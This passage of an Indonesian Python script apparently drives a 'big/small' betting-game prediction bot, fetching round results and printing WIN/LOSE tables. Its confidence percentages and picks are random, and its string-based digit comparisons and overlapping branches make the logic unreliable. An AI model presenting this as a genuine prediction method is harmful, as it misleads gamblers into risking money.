        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '2' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '1' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
            
def taruhanbesarX2eee ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX2Be()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '4' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            losess()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            prediksi1()


			
def auto_besarX1 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = [' •READ• ',' •READ• ']
			cs = ['rumusX1()','rumusX2()','rumusX4()','rumusX5()','rumusX6()','rumusX7()','rumusX8()','rumusX9()','rumusX10()']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}•{taruhanbesarX1()}')


def auto_kecilX1 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			cs = ['rumusX1()','rumusX2','rumusX4','rumusX5','rumusX6','rumusX7','rumusX8','rumusX9','rumusX10']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			sc =h.choice(cs)
			print(f'{G}{taruhankecilX1()}')
			
def taruhankecilX1 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX1K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
    elif f > '0' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK3/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
			 
def taruhanbesarX1 ():
    data = {
        'typeid' : '1',
        'pageno' : '1',
        'language' : 'id'
    }
    gameissue()
    countdownTimerX1B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = [' •READ• ',' •READ• ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    # a = response_GetNoaverageEmerdList()

    response = response_GetNoaverageEmerdList()
    b = json.loads(response.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
        ee = open("Num.txt", 'r')
        f = ee.read()
    if f > '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
    elif f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{CY}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB5/6 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX2()
			 
			 
def auto_besarX2 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = [' •READ• ',' •READ• ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX2()}')


def auto_kecilX2 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX2()}')
			
def taruhankecilX2 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX2K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '2':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '2' and f < '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '1' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '3' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK2/4 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
            
def taruhanbesarX2 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX2B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '4' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB7/9 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX3()
			 
def auto_besarX3 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['5','6','7','8','9']
			m = ['5','6','7','8','9']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['  ?? ','  ?? ']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}•{taruhanbesarX3()}')


def auto_kecilX3 ():
			gameissue()
			e = open("issuenumber.txt", 'r')
			jj = e.read()
			g = ['0','1','2','3','4']
			m = ['0','1','2','3','4']
			j = ['🟢','🟢','🔴','🟢','🔴']
			v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
			p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
			h = random.SystemRandom()
			i = h.choice(g)
			l = h.choice(m)
			z = h.choice(v)
			u = h.choice(p)
			k = h.choice(j)
			print(f'{G}{taruhankecilX3()}')
			
def taruhankecilX3 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX3K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f < '1':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '2' and f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '0' and f < '3':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '4':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} KK1/2 {L} {N}{ BO}{H1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("KECIL LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
			 
def taruhanbesarX3 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX3B()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    # session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
    with open("Num.txt", 'w') as g:
        g.write(ff)
        g.close()
    ee = open("Num.txt", 'r')
    f = ee.read()
    if f > '4' and f < '6':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '6' and f < '8':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW}  WINN  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '5' and f < '7':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f > '7' and f < '9':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} BESAR•{f} {L} {L}{G}┃ {WW2}  JP{L}{PT1}•{f}  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR WIN\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
    elif f < '5':
        print(f'{G}┃{WW3}{jj}{L}{G}┃{PT1} BB6/8 {L} {N}{ BO}{WW1}  {L}{G}┃{PT} {CY} KECIL•{f} {L} {L}{G}┃ {H}  LOSE  {L} {G}┃')
        with open("winlose.txt",'a') as g:
            g.write("BESAR LOSE\n")
            g.close()
            print(L+G+"┣━━━━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━━━━╋━━━━━━━━━━╋━━━━━━━━┫")
            rumusX4()
			 
def auto_besarX4 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}•{taruhanbesarX4()}')


def auto_kecilX4 ():
    gameissue()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['0','1','2','3','4']
    m = ['0','1','2','3','4']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['46%','51%','50%','54%','61%','63%','65%','78%','75%','89%','97%']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    print(f'{G}{taruhankecilX4()}')
			
def taruhankecilX4 ():
    data = {
    'typeid' : '1',
    'pageno' : '1',
    'language' : 'id'
    }
    gameissue()
    countdownTimerX4K()
    e = open("issuenumber.txt", 'r')
    jj = e.read()
    g = ['5','6','7','8','9']
    m = ['5','6','7','8','9']
    j = ['🟢','🟢','🔴','🟢','🔴']
    v = ['ALON-ALON','MIKIR WOY','SANTAI OY','KALEM AEE']
    p = ['  ?? ','  ?? ']
    h = random.SystemRandom()
    i = h.choice(g)
    l = h.choice(m)
    z = h.choice(v)
    u = h.choice(p)
    k = h.choice(j)
    session = requests.Session()
    a = response_GetNoaverageEmerdList()
    b = json.loads(a.text)
    c = b.get('data')
    d = c.get('list')
    e = d[0].get('issueNumber')
    ff = d[0].get('number')
